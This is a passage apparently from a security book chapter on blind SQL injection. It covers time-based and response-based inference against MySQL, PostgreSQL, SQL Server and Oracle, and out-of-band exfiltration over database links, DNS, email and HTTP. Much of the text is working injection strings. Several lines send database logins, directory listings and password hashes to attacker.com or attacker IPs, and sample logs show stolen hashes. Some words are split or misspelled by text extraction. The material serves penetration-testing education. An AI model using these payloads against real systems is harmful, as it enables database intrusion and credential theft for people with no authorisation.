would consume more time than if the bit was 0. this was interesting as it side -stepped any checks that explicitly banned the keywords ‘wait for delay’. alonso rele ased a tool implementing his idea with support for ms access, mysql, sql server and oracle, available from www.codeplex.com/marathontool . figure 5.5 executing waitfor delay since the waitfor keyword is not usable in subqueries, we do not have exploit strings that use waitfor in the where clause. however, sql server does support stacked queries which is very useful in this situation. the approach we follow is to build an exploit string that is simply tagged onto the back of the legitimate query, completely separated through a semi colon. unlike postgresql, this works as the sql server drivers return the first query’s output to the handling application. let us look at an example application that is identical to the movie review application demonstrated with mysql previously, except that now the application runs on sql server and asp.net. the sql query run by the page request count_reviews.aspx?status=madbob is: select count(∗ ) from reviews where review_author=‘madbob’ in order to determine whether the database login is ‘sa’ we could execute the sql: select count( ∗) from reviews where review_author=‘ madbob’; if system_user=‘ sa’ waitfor delay ‘00:00:05’ if the request took longer than 5 s then we infer that the login is ‘sa’. converted into a page request, this becomes: count_reviews.aspx?review_author=madbob’; if system_user=‘sa’ waitfor delay ‘00:00:05 you may have noticed that the page request did not have a trailing single quote and this was intentional as the vulnerable query supplied the final single quote. another point to consider is that the inference question we choose to ask has fewest possible answers: instead of testing whether we are not ‘sa’ we seek to affirm that we are by pausing for 5 s. if the question was inverted such that the delay only occurred when the login was not ‘sa’, then a quick response can infer ‘sa’ but it could also be as a result of a problem with the exploit. where a long response time is used to positively infer ‘sa’, a loaded server could cause confusion. however, repeating the test and continuing to observe long load times increases our confidence. since we can choose either a binary search or bit -by-bit method to infer data and, given that the underlying techniques and theory has already been dealt with in depth, we merely provide exploit strings for both in the next two subsections. generic sql server binary search inference exploits string injection points (utilize stacked queries so unions not required): ’; if ascii(substring((...),i ,1)) > k waitfor delay ‘00:00:05’;-- where i is the i th byte returned by the one -row subquery (...) and k is the current middle value of the binary search. numeric injection points are identic al except for the absence of the initial single quote: ; if ascii(substring((...),i ,1)) > k waitfor delay ‘00:00:05’;-- generic sql server bit -by-bit inference exploits the following is an example for string injection points using the bitwise and, which can be substituted for other bit operations. this exploit utilizes stacked queries so union is not required: ’; if ascii(substring((...),i ,1))&2j=2j waitfor delay ‘00:00:05’; -- where i is the i th byte returned by the subquery (...) and j is the bit position under examination. numeric injection points are identical exception for the absence of the initial single quote: ; if ascii(substring((...),i ,1))&2j=2j waitfor delay ‘00:00:05’;-- oracle delays the situation with time -based blind sql injection on oracle is a little stickier. while it is true that a sleep() equivalent exists in oracle, the manner in which sleep() is called does not allow for it to be embedded in a where clause of a select statement. a number of sql injection resources point to the dbms_lock package, which amongst other functions provides the sleep() function. this can be called with: begin dbms_lock.sleep(n ); end; where n is the number of seconds to halt execution for. however there are a number of restrictions with this method: first and foremost th is cannot be embedded in a subquery as it is pl/sql code not sql, and since oracle does not support stacked queries this sleep() function is somewhat of a white elephant. secondly, the dbms_lock package is not available to users apart from dbas by default and since non- privileged users are commonly used to connect to oracle databases (well, more often seen than in the sql server world) this effectively makes the dbms_lock trick moot. if we are lucky and the injection points were in a pl/sql block then the f ollowing snippet would generate a delay: if (bitand(ascii(substr((...),i ,1)),2j)=2j) then dbms_lock.sleep(5); end if; where i is the i th byte returned by the subquery (...) and j is the bit position under examination. slavik marchovic showed ( http://www.slaviks -blog.com/2009/10/13/blind- sql-injection -inoracle/ ) that time -based attacks can be implemented using the function dbms_pipe.receive_message . this function is granted to public by default and allows one to specify a message timeout when reading from a pipe and, since it is a function, can be embedded into sql queries. the example below pauses execution for 5 s if the connecting user is a dba: count_reviews.aspx?review_author=madbob’ or 1 = case when sys_context(‘userenv’,‘isdba’)=‘true’ then dbms_pipe.receive_message(‘foo’, 5) else 1 end– one could also attempt the heavy query approach pioneered by alonso. time -based inference considerations now that we have looked at specific exploit strings for four databases that enable both binary search and bit extraction time -based inference techniques, there are a few messy details that should be brought to light. we have considered timing to be a mostly static attribute where in one case a request completes quickly but in the other state it completes very slowly, allowing us to infer state information. however this is only reliable where the causes of delay are guaranteed; in the real world this is seldom the case. if a request takes a long time then it could be as a result of the intentional delay we inserted, but the slow response might equally be caused by a loaded database or congested communications channel. we can partially solve this in one of two w ays: 1. set the delay long enough to smooth out possible influence from other factors. if the average rtt is 50 ms then a 30 s delay provides a very wide gap that will mostly prevent other delays from drowning out the inference. unfortunately the delay val ue is dependent on the line conditions and database load, which are dynamic and hard to measure and so we tend to over-compensate making the retrieval of data inefficient. setting the delay value too high also runs the risk of triggering timeout exceptions either in the database or in the web application framework. 2. send two almost identical requests simultaneously with the delay -generating clause dependent on a 0 -bit in one request and a 1- bit in the other. the first request to return (subject to normal error checking) will likely be the predicate that did not induce a delay, and state can be inferred even in the presence of non- deterministic delay factors. the assumption that this rests on is that if both requests are made simultaneously, then the unpredictable delays are highly likely to affect both requests. using response -based techniques just as request timing was used to infer information about a particular byte, a second method for inferring state is by carefully examining all data in the response i ncluding content and headers. state is inferred either by the text contained in the response or by forcing errors when particular values are under examination. for example, the inference exploit could contain logic that alters the query such that results a re returned when the examined bit is 1 and no results if the bit is 0, or again, an error could be forced if a bit is 1 and no error generated when the bit is 0. although error generating techniques are delved into shortly, it is worth mentioning that the types of errors we strive to generate are runtime errors in the application or database query execution rather than query compilation errors from the database. if the syntax in the query is wrong then it will always produce an error regardless of the infer ence question; the error should only be generated when the inference question is either true or false, but never both. most blind sql injection tools use response -based techniques for inferring information as the results are not influenced by uncontrolled variables such as load and line congestion; however this approach does rely on the injection point returning some modifiable response to the attacker. we can use either the binary search approach or the bit -by-bit approach when inferring information by por ing over the response. mysql response techniques consider the case where the sql query below is executed through a web application with input data madbob and returns one row from the reviews table that is contained in the page response. the query is: select count(∗ ) from reviews where review_author=‘ madbob’ the result of execution is a single row containing the number of reviews written by madbob and this is displayed on the webpage in figure 5.6 . figure 5.6 query for ‘madbob’ returns a count of two reviews, used as true inference by inserting a second predicate into the w here clause, it is possible to alter whether any results are returned by the query. we can then infer one bit of information by asking whether the query returned a row or not with the statement: select count(∗ ) from reviews where review_author=‘ madbob’ and ascii(substring(user(), i,1))&2j=2j # if no results are returned then we can infer that bit j of byte i is 0, otherwise the bit is 1. this is visible in figure 5.7, where a search with the string “ madbob’ and if(ascii(substring(user(),1,1))>127,1,0)# ” produced a zero review count. this is a false state and so the first character has an ascii value less than 127. figure 5.7 query returns a count of zero reviews and is a false inference where numeric parameters are used, it is possible to split and balance input. if the original query is: select count(∗ ) from reviews where id= 1 then a split and balanced injection string that implements the bit- by-bit approach is: select count(∗ ) from reviews where id=1+ if(ascii(substring(current_user(),i ,1))&2j=2j,1,0) where it is not possible to alter con tent, an alternative method of inferring state is to force database errors where a 1 -bit is seen, and no errors when a 0- bit is seen. using mysql subqueries in combination with a conditional statement, we can selectively generate an error with this sql que ry that implements the bit- by-bit inference method: select count( ∗) from reviews where id=if(ascii(substring(current_user(),i ,1))&2j=2j,(select table_name from information_schema.columns where table_name = (select table_name from information_schema.columns)),1); this is fairly dense, so it helps to break the query up into pieces. the conditional branching is handled by the if() statement and the condition we are testing is one we have seen quite regularly through this chapter, ascii(substring(current_user(), i,1))&2j=2j, which implements the bit -by-bit inference method. if the condition is true (i.e. bit j is a 1 -bit), then the query “select table_name from information_schema.columns where table_name = (select table_name from information_schema.columns) ” is run and this query has a subquery that returns multiple rows in a comparison. since this is forbidden, execution halts with an error. on the other hand, if bit j was a 0 -bit then the if() statement returned the value ‘1’. the true branch on the if() statement uses the built -in information_schema.columns table as this exists in all mysql databases version 5.0 and higher. it should be pointe d out that when using an application written in php with mysql as the data store, errors arising from the execution of database queries do not generate exceptions that cause generic error pages. the calling page must either check whether mysql_query() returns false, or whether mysql_error() returns a non -empty string; if either condition exists then the page prints an application specific error message. the result of this is that mysql errors do not produce http 500 response codes, rather the regular 200 re sponse code is seen. postgresql response techniques response -based attacks for postgresql are similar to mysql. we can then infer one bit of information by asking whether the query returned a row or not with the statement: select count(∗ ) from reviews where review_author=‘madbob’ and ascii(substring(user(), i,1))&2j=2j-- if no results are returned then we can infer that bit k of byte i is 0, otherwise the bit is 1. for split and balanced numeric input, a query relying on our (discussed earlier in the chapter ) user -defined pause() function might look like: select count(∗ ) from reviews where id=1+(select case when (ascii(substr(... ,i,1)&2j=2j) then pause(1) else 0 end);-- pause() returns 1; a trivial extension would be to alter the function definition to return a user-supplied value. similarly to mysql, database errors can be forced when content is unalterable by selectively forcing a divide- by-zero condition. the query below produces an error when the condition (...), which could be a binary search or bit -by-bit ex ploit, is true: select case (...) when true then 1/0 end this can be combined into split and balanced exploits quite easily: ‘||(select case (...) when true then 1/0 end)||’ error management is highly dependent on the handling application. for example, a php installation configured with “display_errors = on” would likely display error messages from the database (subject to further configuration parameters). but it is also likely that the page handles errors itself without displaying detailed error information; in terms of this blind injection technique, so long as a differentiation is visible then information can still be extracted. sql server response techniques consider the t -sql below that can infer 1 -bit of information by asking whether a vulnerable query re turned rows or not with the statement: select count(∗ ) from reviews where review_author=‘ madbob’ and system_user=‘ sa’ if the query returned results then the login in use was ‘sa’, and if no rows came back then the login was something else. we can integrate this quite easily with the binary search and bit by-bit inference methods in order to extract the actual login: select count(∗ ) from reviews where review_author=‘ madbob’ and ascii(substring(system_user,i ,1))>k-- or select count(∗ ) from reviews where review_author=‘ madbob’ and ascii(substring(system_user,i ,1))&2j=2j the split and balance trick works quite nicely with response -based inference on sql server. combined with a conditional subquery that uses case, we can include a string as part of the search depending on the state of a bit or value. consider first a binary search example: select count( ∗) from reviews where review_author=‘ mad’+(select case when ascii(substring(system_user,i ,1))>k then ‘bob’ end) + ’’ here is the matching bit -by-bit example: select count( ∗) from reviews where review_author=‘ mad’+(select case when ascii(substring(system_user,i ,1))&2j=2j then ‘bob’ end) + ’’ if either of the above two queries returned results only seen for the search input ‘madbob’, then in the binary search exploit the i th byte had an ascii value greater than k or in the bit -bybit exploit the i th byte had the j th bit set to 1. we could also force a database error in cases where the page does not return content but does trap database errors and displays either a default error page or an http 500 page. one common example of this is asp.net websites running on iis 6 and 7 that do not have the <customerror> tag set in the web.config configuration file (or where this can be bypassed—refer to tip), and where the vulnerable page does not trap exceptions. if a broken sql query is submitted to the database then a page similar to that shown in figure 5.8 is displayed and digging deeper into the returned http headers reveals that the http status was 500 ( figure 5.9). the error page does not lend itself to the regular error -based extraction methods since database error messages are not included. tip in the instance an asp.net application catches unhandled exceptions using a custom error page defined in the web.config <customerror> tag, introducing or modifying an aspxerrorpage par ameter to point to a non -existent page can often bypass the error page. therefore if the following resulted in a custom error page via this functionality: count_reviews.aspx?review_author=madbob’ the following will often reveal the underlying error that wa s caught: count_reviews.aspx?review_author=madbob’&aspxerrorpath=/foo figure 5.8 default exception page in asp.net figure 5.9 response headers showing 500 status introducing errors can be tricky. the error cannot exist in the syntax since this would cause the query to always fail before execution; rather we want the query to fail only when some condition exists. this is often accomplished with a divide -by-zero clause combined with a condi tional case: select ∗ from reviews where review_author=‘ madbob’+(case when ascii(substring(system_user,i ,1))>k then cast(1/0 as char) end) the underlined division operation will only be attempted if the k th bit of byte i is 1, allowing us to infer state. oracle response techniques the oracle response -based exploits are quite similar in structure to mysql, postgresql, and sql server, but obviously rely on different functions for the key bits. for example, to determine whether the database user is a dba, the following sql query will r eturn rows when this is true. otherwise no rows are returned: select ∗ from reviews where review_author=‘ madbob’ and sys_context(‘ userenv’ ,‘isdba’)=‘true’; likewise, a bit -by-bit inference exploit that measures state based on whether results are returned or not can be written with a second injected predicate: select ∗ from reviews where review_author= ‘madbob’ and bitand(ascii(substr((...),i ,1)),2j)=2j the binary search form is: selet ∗ from reviews where review_author=‘ madbob’ and ascii(substr((... ),i,1)) > k using oracle’s string concatenation it is also possible to make the exploit safe to use in a function or procedure argument list by rewriting as a split and balanced string with concatenation and a case statement: mad’||(select case when (ascii(substr((...), i,1)) > k then ‘bob’ else ’’ end from dual)||’; with the above snippet, the full ‘madbob’ string is only generated when the inference test returns true. finally, it also possible to generate runtime errors with a divide -by-zero clause, similar to sql server . here is a sample snippet that contains a zero divisor in a split and balanced bit by-bit approach: madbob’||(select case when bitand((ascii(substr((...),i ,1))2j)=2j then cast(1/0 as char) else ’’ end from dual)||’; observe how the division had to be wrappe d in a cast() otherwise the query would fail with a syntax error. when the inference question returned true in a vulnerable page running on apache tomcat, then an uncaught exception was thrown resulting in the http 500 server error shown in figure 5.10. figure 5.10 uncaught oracle exception caused by a zero divisor return ing more than 1 bit of information so far each inference technique has been focused on deriving the status of a single bit or byte based on whether the inference question returned true or false, and the fact that only two states were possible permitted the extraction of exactly one bit of information per request. if more states are possible then more bits can be extracted per request which would improve the bandwidth of the channel. the number of bits that can be extracted per request is log 2 n where n is the number of possible states a request could have. to quantify this with actual figures, each request would need 4 states to return 2 bits, 8 states to return 3 bits, 16 states to return 4 bits, and so on. but how can more states be introduced into a r equest? in some cases it is not possible to introduce more states just as blind sql injection is not possible in all vulnerable injection points, but it often is possible to extract more than one bit. in cases where the inference question is answered with timing methods or content methods, then it is possible to introduce more than two states. note adding an additional state does not add a full additional bit of information, and each additional state adds less information than the preceding bit. were eight states available, we would still require three requests to extract a regular 8 -bit byte; to extract the information in two requests requires a minimum of 128 states, and the only way to retrieve a full byte in a single blind query is if there are 256 possi ble states. where states are not powers of 2, complexity arises too, since the value being extracted needs to be translated into a number with the base being the possible states. in other words, if three states are available then extracted data must first be converted into a ternary (or base -3) number, and five states require base -5 numbers. performing these conversions makes exploits longer and less reliable, and so trying to extract more than a single bit per request is quite unusual. up until now, the bi t-by-bit approach has asked whether bit j of byte i is 1. if four states are possible, then the inference question could be a series of questions that ask whether the two bits starting at bit j of byte i are 00, 01, 10, or 11. where timing is used as the i nference method, this could be phrased as the following sql server case statement: case when ascii(substring((...),i ,1))&(2j+2j+1) = 0 then waitfor delay ‘00:00:00’ when ascii(substring((...),i ,1))&(2j+2j+1) = 2j then waitfor delay ‘00:00:05’ when ascii(substring((...),i ,1))&(2j+2j+1) = 2j+1 then waitfor delay ‘00:00:10’ else then waitfor delay ‘00:00:15’ end this does not seem particularly remarkable; in the worst case (where the bit string is ‘11’) this case statement yields a 15 s delay w hich is longer than if these two bits were extracted one at a time with a 5 s delay, but on uniformly distributed data the average delay is under 10 s. most significantly, this approach requires fewer requests so the total time spent on request submission and response transmission is lowered, and the likelihood of detection via abnormal request counts decreases. another option to increase the number of states is to alter the search term in a where clause so that, for instance, one of four possible results i s displayed allowing us to infer the bit string: select ∗ from reviews where review_author= ’’ + (select case when ascii(substring((...),i ,1))&(2j+2j+1)= 0 ‘madbob’ when ascii(substring((...),i ,1))&(2j+2j+1)= 2j ‘hogarth’ when ascii(substring((...),i ,1))&(2j+2j+1)= 2j+1 ‘jag’ else ‘eliot’ end) when the search results match ‘madbob’ then the inference is ‘00’, when ‘hogarth’ then ‘01’, when ‘jag’ then ‘10’ and when ‘eliot’ then ‘11’. the two case statements provided above demonstrate how to improve the bit-by-bit approach, and it is also possible to improve the binary search approach. one of the major drawbacks to the binary search is that only a single relation is tested, namely “greater than.” say the ascii value of the byte under examination is 127, then the first inference question asks “is 127 > 127?” the answer is false and so seven further questions must be used to refine the question until we ask “is 127 > 126?” after which the value is inferred. instead, we would like to insert a second, shortcut, question after the first inference question: “is 127 = 127?” but include both questions in a single request. we can do this through a case statement implementing a binary search method combined with an error -generating divide -byzero clause: case when ascii(substring((...),i ,1)) > k then waitfor delay ‘00:00:05’ when ascii(substring((...),i ,1)) = k then 1/0 else then waitfor delay ‘00:00:00’ end thus if an error is observed then i = k, or if the request is delayed by 5 s then i is greater than k otherwise i is less than k. using alternative channels the second major category of techniques for retrieving data with blind sql injection vulnerabilities is the use of alternative or out -of-bound channels. instead of relying on an inference technique to derive data, channels apart from the http response are co -opted into to carrying chunks of data for us. the channels are not applicable to all databases as they tend to rely on the database’s supported functionality; by way of example dns is a channel that can be utilized with postgresql, sql server, and oracle, but not with mysql. we will discuss four separate alternative channels for blind sql injection: database connections, dns, email, and http. the basic idea is to package the results of a sql query in such a way that they can be carried back to the attacker using one of the four alternative channels. database connections the first example alternative channel is specific to microsoft sql server and permits an attacker to create a connection from the victim’s database to the attacker’s database and carry query data over the connection. this is accomplished using the openrowset command and can be an attacker’s best friend where available. for this attack to work, the victim database must be able to open a tcp connection to the attacker’s database, usually on the default port 1433; if egress filtering is in place at the victim or the attacker is performing ingress filtering then the connection will fail. however, you can connect to a different port, simply b y specifying the port number after the destination ip address. this can be very useful when the remote database server can connect back to your machine only on a few specific ports. openrowset is used on sql server to perform a one -time connection to a rem ote ole db data source (e.g. another sql server). one example legitimate usage is to retrieve data that resides on a remote database as an alternative to linking the two databases, which is more suited to cases when the data exchange needs to be performed on a regular basis. a typical way to call openrowset is as follows: select ∗ from openrowset(‘ sqloledb’ , ‘network=dbmssocn; address=10.0.2.2;uid=sa; pwd=mypassword ’, ‘select review_author from reviews’ ) what happens here is that we connect to the sql serve r at the address 10.0.2.2 as user ‘sa’, and we run the query “ select review_author from reviews ”, whose results are transferred back and visualized by the outermost query. the user ‘sa’ is a user of the database at the address 10.0.2.2, and not of the data base where openrowset is executed. also note that in order to successfully perform the query as user ‘sa’ we must successfully authenticate providing its correct password. we have already been introduced to openrowset in chapter 4 so let us concern ourselves mainly with its application to blind sql injection. although the example usage above retrieves results from a foreign database with the select statement, we can also use openrowset to transmit data to a foreign data base using an insert statement: insert into openrowset(‘sqloledb’,‘network=dbmsocn; address=192.168.0.1;uid=foo; pwd=password’, ‘select ∗ from attacker_table’ ) select name from sysobjects where xtype=‘ u’ by executing this query, names of user tables on the local database are inserted into attacker_table which resides on the attacker’s server at the address 192.168.0.1. of course, in order for the command to complete correctly, attacker_table’s columns must match the results of the local query so the table w ould consist of a single varchar column. clearly this is a great example of an alternative channel; we can execute sql that produces results and carries them in real -time back to the attacker. since the channel is not dependent at all on the page response, openrowset is an ideal fit for blind sql injection vulnerabilities. this has been recognized by tool authors; there are at least two public tools that rely on openrowset for exploitation: datathief by cesar cerrudo and bobcat by nmonkee. the first is a pr oof-of-concept tool that demonstrates the power of openrowset and the second is a tool that removes much of the complexity of executing openrowset attacks through a gui. this technique is not limited to data. if you have administrative privileges and have access to the xp_cmdshell extended procedure (see chapter 6 for more information on this topic), the same attack can also be used to obtain the output of commands that have been executed at the operating system level. for instance, the following query would make the target database send the list of file and directories of c: \\ insert into openrowset(‘sqloledb’,‘network=dbmssocn;address=www.attacker.com:80; uid=sa; pwd=53kr3t’,‘select ∗ from table’ ) exec master..xp_cmdshell ‘dir c:\\ ’ oracle also supports creating database links, though these statements cannot be embedded in other queries thus limiting their usefulness. postgresql drivers, on the other hand, often accept stacked queries. a database superuser can enable the ‘dblink’ extension in postgresql 9.1 or newer using: create extension dblink; from there, the dblink family of commands can be leveraged to copy data from the victim database to a postgresql instance controlled by the attacker. however it is not for the fa inthearted since the functions only operate on rows, not result sets. if you follow this route, then be prepared to write pl/pgsql functions that rely on cursors to iterate over the data. one simple example that will dump database users and their password hashes is: create or replace function dumper() returns void as $$ declare rvar record; begin for rvar in select usename||‘,’||passwd as c from pg_shadow loop perform dblink_exec(‘host=172.16.0.100 dbname=db user=uname password=pass’, ‘insert into dumper values(‘‘‘||rvar.c||’’’)’); end loop; end; $$ language ‘plpgsql’; dns exfiltration as the most well known alternative channel, dns has been used both as a marker to find sql injection vulnerabilities as well as a channel on which to carry data. the advantages of dns are numerous: • where networks have only ingress but no egress filtering or tcp -only egress filtering the database can issue dns requests directly t o the attacker. • dns uses udp, a protocol that has no state requirements so exploits can “fire -and-forget.” if no response is received for a lookup request then at worst a non- fatal error condition occurs. • the design of dns hierarchies means that the vu lnerable database does not have to be able to send a packet directly to the attacker. intermediate dns servers will mostly be able to carry the traffic on the database’s behalf. • when performing a lookup, the database will by default rely on the dns serve r that is configured into the operating system, which is normally a key part of the basic system setup. thus in all but the most restricted networks, a database can issue dns lookups that will exit the victim’s network. the drawback of dns is that the attacker must have access to a dns server that is registered as authoritative for some zone (‘ attacker.com ’ in our examples) where he can monitor each lookup performed against the server. typically this is performed either b y monitoring query logs or by running ‘tcpdump’. postgresql, sql server, and oracle all have the ability to directly or indirectly cause a dns request to be made. under oracle this is possible with the utl_inaddr package which has an explicit get_host_addr ess function to lookup forward entries and get_host_name to lookup reverse entries: utl_inaddr.get_host_address(‘www.victim.com’) returns 192.168.0.1 utl_inaddr.get_host_name(‘192.168.0.1’) returns www.victim.com these are more useful than the previously c overed dbms_lock.sleep function, since the dns functions do not require pl/sql blocks; thus they can be inserted into subqueries or predicates. the next example shows how the database login can be extracted by an insertion into a predicate: select ∗ from reviews where review_author=utl_inaddr.get_host_address((select user from dual)||‘.attacker.com’) postgresql does not support direct lookups, but dns queries can be initiated through a trick in the xml parsing libraries. you may recall xml entity injection as an early attack against xml parsers; it is possible to use this attack against postgresql databases to cause dns lookups. in the example that follows, a lookup that contains the database username is sent to the dns server for ‘ attacker.com ’: select xmlparse(document ‘<?xml version=“1.0” encoding=“iso- 8859-1”?><!doctype x [ <!element x any ><!entity xx system “http:// ‘||user||’attacker.com./” >]>’); where dblink is installed on postgresql, a hostname can be specified i n the connection string causing a dns lookup, but this requires superuser access. sql server too does not support an explicit lookup mechanism, but it is possible to also initiate indirect dns requests through certain stored procedures. for example, one could execute the ‘nslookup’ command through the xp_cmdshell procedure (only available to the administrative user and in sql server 2005 and later disabled by default): exec master..xp_cmdshell ‘nslookup www.victim’ the advantage of using ‘nslookup’ is that the attacker can specify their own dns server to which the request should be sent. if the attacker’s dns server is publicly available at 192.168.1.1 then the sql snippet to directly lookup dns requests is: exec master..xp_cmdshell ‘nslookup www.victim 192.168.1.1’ we can tie this into a little shell scripting to extract directory contents: exec master..xp_cmdshell ‘for /f “tokens=5”%i in (‘‘dir c: \\’’) do nslookup %i.attacker.com’ which produces the lookups: has.attacker.com.victim.com . has.attacker.com . 6452- 9876.attacker.com.victim.com . 6452- 9876.attacker.com . autoexec.bat.attacker.com.victim.com . autoexec.bat.attacker.com . comment.doc.attacker.co m.victim.com. comment.doc.attacker.com . wmpub.attacker.com.victim.com . wmpub.att acker.com . free.attacker.com.victim.com . free.attacker.com . clearly the exploit had problems; we do not receive all output from the ‘dir’ as only the fifth space- delimited token is returned from each line and this method cannot handle file or directory names that have spaces or other disallowed domain name characters. the observant reader would also have noticed that each filename is queried twice and the first quer y is always against the domain ‘ victim.com’ . note this is the default search domain for the database machines and lookups on the default domain can be prevented by appending a period (.) to the name that is passed to nsloo kup. there are other stored procedures that will cause a sql server to lookup a dns name and they rely on windows’ built -in support for network unc paths. many windows file -handling routines can access resources on unc shares and when attempting to connect to a unc path the os must first lookup the ip address. for instance, if the unc path supplied to some file handling function is ‘ \\\\poke.attacker.com \\blah’ then the os will first perform a dns lookup on ‘poke.attacker.com ’. by monitoring the server that is authoritative for the ‘ attacker.com ’ zone, the attacker can then ascertain whether the exploit was successful or not. the proc edures are specific to sql server versions: • xp_getfiledetails (2000, requires a path to a file) • xp_fileexist (2000, 2005, 2008, and 2008 r2, requires a path to a file) • xp_dirtree (2000, 2005, 2008, and 2008 r2, requires folder path) for instance, to extract the database login via dns one could use: declare @a char(128);set @a=‘\\ \\’+system_user+‘.attacker.com.’; exec master..xp_dirtree @a in the snippet above, an intermediate variable was used to store the path since string concatenation is not permitte d in the procedure’s argument list. the sql indirectly caused a dns lookup for the hostname sa.attacker.com . indicating that an administrative login was used. as was pointed out when performing dns lookups through xp_cmdshell, the presence of illegal characters in a path will cause the resolver stub to fail without attempting a lookup, as will a unc path that is over 128 characters long. it is safer to first convert data we wish to retrieve into a format that is cleanl y handled by dns and one method for this is to convert the data into a hexadecimal representation. sql server contains a function called fn_varbintohexstr() that takes as its sole argument a parameter of type varbinary and returns a hexadecimal representat ion of the data: select master.dbo.fn_varbintohexstr(cast(system_user as varbinary)) produces: 0x73006100 which is the unicode form of ‘sa’. the next problem is that of path lengths. since the length of data is quite likely to exceed 128 characters we run the risk of either queries failing due to excessively long paths or, if we only take the first 128 characters from each row, missing out on data. by increasing the complexity of the exploit we can retrieve specific blocks of data using a substring() call. the example below performs a lookup on the first 26 bytes from the first review_body column in the reviews table: declare @a char(128); select @a=‘\\ \\’+master.dbo.fn_varbintohexstr(cast(substring((select top 1 cast(review_body as char(255)) from reviews),1,26) as varbinary(255)))+‘.attacker.com.’; exec master..xp_dirtree @a; which produced “0x4d6f7669657320696e20746869732067656e7265206f667465.attacker.com .” or “movies in this genre ofte.” path length is unfortunately not the last complexity that we face. although unc paths can be at most 128 characters, thi s includes the prefix ‘ \\\\’, the domain name that is appended as well as any periods used to separate labels in the path. labels are strings in a path that are separated by periods, so the path “ blah.attacker.com ” ha s three labels, namely “blah,” “attacker,” and “com.” it is illegal to have a single 128 byte label since labels can have at most 63 characters according to dns standards. in order to format the pathname such that it fulfills the label length requirements, a little more sql is required to massage the data into the correct form. an additional small detail that can get in the way when using dns is that intermediate resolvers are allowed to cache results which might prevent lookups from reaching the attacker’s dns server. this can be bypassed by including a variable value in the lookup so that subsequent lookups are not identical; current time is one option as is the row number or a true random value. finally, enabling the extracting of multiple rows of data re quires wrapping all of the above refinements in a loop that extracts rows one by one from a target table, breaks the data up into small chunks, converts the chunks into hexadecimal, insert periods every 63 characters in the converted chunk, prepends ‘ \\\\’ and appends the attacker’s domain name, and executes a stored procedure that indirectly causes a lookup. the challenge of extracting all data (regardless of length or type) through dns is tricky and solvable on sql server database mainly due to t -sql which provides loops, conditional branching, local variables, and so on. even though oracle has explicit dns functions, its more serious limitations from an attacker’s point of view (lack of pl/sql injection in sql) prevents the exploitation seen on sql server . tools & traps... zoning out in the examples covered here we assume that the attacker controls the zone ‘ attacker.com ’ and has full access to the authoritative server for that zone. however, when using dns as an exfiltratio n channel on a regular basis for assessments or other work, using your zone’s authoritative dns server as the staging ground for the attack seems brash. apart from the fact that this requires granting all colleagues unfettered access to the server, it is also not flexible. rather it creates at least one subdomain that has an ns record pointing to the machine to which you grant full access to all colleagues. one could even create a subdomain per colleague with the ns pointing to a machine controlled by that colleague. here is a quick run through on how a subdomain can be added to the zone ‘attacker.com ’ in the bind name server software. in the zone file for domain ‘ attacker.com ’ add the l ines: dnssucker.attacker.com. ns listen.attacker.com. listen.attacker.com. a 192.168.1.1 the first line contains the ns record while the second provides a glue record. on the machine ‘listen.attacker.com ’, a dns server is installed that is authoritative for the domain ‘ dnssucker.attacker.com ’. subsequent dns exfiltration will use ‘. dnssucker.attacker.com ’ as a suffix. email exfiltration both sql server and oracle support sending emails from within the database and email presents an intriguing exfiltration channel. quite similarly to dns, emails sent using the simple mail transport protocol (smtp) do not r equire a direct connection between the sender and recipient. rather, an intermediate network of mail transfer agents (mta), or email servers, carries the email on the sender’s behalf. the only requirement is that there exists a route from the sender to rec eiver and this indirect approach is a useful channel for blind sql injection where other more convenient channels are not possible. a limitation of the approach is its asynchronous nature; an exploit is sent and the email could take a while to arrive hence there are no tools that the authors are aware of that support smtp as a channel for blind sql injection. chapter 4 contains an in -depth discussion on how one might setup and use email facilities within sql server and oracle. http exfiltration the final exfiltration channel examined here is http, which is available in databases that provide functionality for querying external web servers and usable in installations where the database machine has network -layer permission to access web resources controlled by the attacker. sql server and mysql do not have default mechanisms for constructing http requests, but one could get there with custom extensions. postgresql too does not have a native method for invoking http requests , however if an external language such as perl or python was been enabled at build time, then one can write postgresql functions that wrap the external language’s http libraries. oracle on the other hand has an explicit function and object type by which ht tp requests can be made, provided by the utl_http or httpuritype packages. the function and the object type are quite useful as they can be used in regular sql queries so a pl/sql block is not required. either method may be granted to public (depending on the version of oracle used) in which case any database user can execute them. httpuritype is not mentioned in most oracle hardening guides and is normally not removed from public. http requests are as powerful as union selects. usage of the functions / obj ect types is as follows: utl_http.request(‘www.attacker.com/’) httpuritype(‘\\ www.attacker.com/’).getclob this can be combined with a blind sql injection vulnerability to form exploits that combine the data we wish to extract with a request to a web server we control using string concatenation: select ∗ from reviews where review_author=utl_http.request(‘ www.attacker.com/’ ||user) after reviewing the request logs on the web server, we find the log entry containing the database login (underlined): 192.168.1.10 - - [13/jan/2009:08:38:04 -0600] “get /sqli http/1.1” 404 284 this oracle function has two interesting characteristics: as part of the request a hostname must be converted into an ip address implying a second method to cause dns requests to be issued where dns is the exfiltration channel, and the utl_http.request function supports https requests which could aid in hiding outgoing web traffic. the role of utl_http/httpuritype is often underestimated. it is possible to download an entire table with this function by using proper sql statements. depending on the position of injection in the query it is possible that the following approach works: select ∗ from unknowntable union select null, null, null from length(utl_http.request( ‘www.attacker.com/ ’||username||chr(61)|| password)) here all usernames and passwords are sent to the access log of the attacker. this channel can also be used for the split and balance technique (where the original parameter’s value was ‘aa’): for oracle 11g only ‘a’||chr(utl_http.reques t(‘www.attacker.com/’||(select sys.stragg(distinct username||chr(61)||password||chr(59)) from dba_users)))||’a produces the log entry: 192.168.2.165 - - [14/jan/2009:21:34:38 +0100] “get /sys=ad24a888fc3b1be7;system=bd3d49ad69e3fa34;dbsnmp=e066d214d5421ccc;ibo=7a0f2b316c212d67 ;outln=4a3ba55e08595c81;wmsys=7c9ba362f8314299;ordsys=7c9ba362f8314299;ordplugins=88a2b2c183431f00 http/1.1” 404 2336 for oracle 9i rel. 2 and higher + xmlb ‘a’||chr(utl_http.request(‘attacker.com/’||(select xmltransform(sys_xmlagg(sys_xmlgen(username)),xmltype(‘<?xml version=“1.0”?><xsl:stylesheet version=“1.0” xmlns:xsl=“http://www.w3.org/1999/xsl/transform”><xsl:template match=“/”><xsl:for- each select=“/rowset/username”><xsl:value- of select=“text()”/>;</xsl:for each></xsl:template></xsl:stylesheet>’)).getstringval() listagg from all_users)))||’a produces the log entry: 192.168.2.165 - - [14/jan/2009:22:33:48 +0100] “get /sys;system;dbsnmp;ibo;outln;wmsys;ordsys;ordplugins http/1.1” 404 936 using httpuritype ... union select 